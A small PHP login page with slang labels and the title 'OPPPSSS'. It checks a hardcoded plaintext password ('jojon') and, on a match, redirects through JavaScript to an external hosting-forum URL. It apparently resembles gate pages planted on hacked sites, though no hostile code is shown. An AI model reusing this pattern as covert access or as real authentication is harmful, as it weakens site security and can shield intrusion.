<?php
   ob_start();
   session_start();
?>
<html lang = "en">
    <head>
      <title>OPPPSSS</title>
   </head>
	  <body>
        <div class = "container">
        <form class = "form-signin" role = "form" 
        action = "<?php echo htmlspecialchars($_SERVER['PHP_SELF']); 
         ?>" method = "post">
            <h4 class = "form-signin-heading"></h4>
            </br>
            <input type = "password" class = "form-control"
               name = "password" placeholder = "PASWOD" required>
            <button class = "btn btn-lg btn-primary btn-block" type = "submit" 
               name = "login">MASUAK</button>
         </form>
			
        <a href = "i.php" tite = "Logout">KALUAR</a>
         
      </div> 
      <div class = "container form-signin">
         
         <?php
            $msg = '';
            
            if (isset($_POST['login']) && !empty($_POST['password'])) {
				
               if ( 
                  $_POST['password'] == 'jojon') {
                  $_SESSION['valid'] = true;
                  $_SESSION['timeout'] = time();

echo "<script LANGUAGE=\"JavaScript\">
                       
<!--
window.location=\"http://community-support.rumahweb.org/hosting/--biak--\";
// -->
</script>"; 
				 


               }else {
                  $msg = 'SALAH JE RAK';
               }
            }
         ?>
      </div> 
     
      <?php echo $msg; ?>
   </body>
</html>